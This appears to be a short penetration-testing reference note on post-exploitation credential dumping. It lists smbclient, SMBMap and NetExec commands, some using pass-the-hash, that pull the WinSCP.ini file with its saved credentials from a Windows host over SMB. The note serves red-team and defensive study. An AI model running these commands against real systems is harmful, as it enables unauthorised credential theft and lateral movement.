# Unix Shell

## SMBClient

```
$ smbclient -U "[<domain>/]<username>%<password>" //<IP>/C$

$ smbclient -U "[<domain>/]<username>" --pw-nt-hash <nt_hash> //<IP>/C$

smb: \> more "/Program Files (x86)/WinSCP/WinSCP.ini"
```

## Impacket

```
$
```

## SMBMap

```
$ smbmap -u "<username>" -p "< <password> | <nt_hash> >" [-d <domain>] -H <IP> --download "C$\Program Files (x86)\WinSCP\WinSCP.ini"
```

## NetExec

```
$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] --get-file "/Program Files (x86)/WinSCP/WinSCP.ini" WinSCP.ini

$ netexec smb <IP> -u <username> -p <password> [-d <domain> | --local-auth] -M winscp
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x03 - OS Credential Dumping/Windows/Host/Sensitive Files/Config Files/Network Ports/SSH/Living off the Land]]

### NetExec Wiki

- [NetExec Wiki: Dump WinSCP](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-winscp)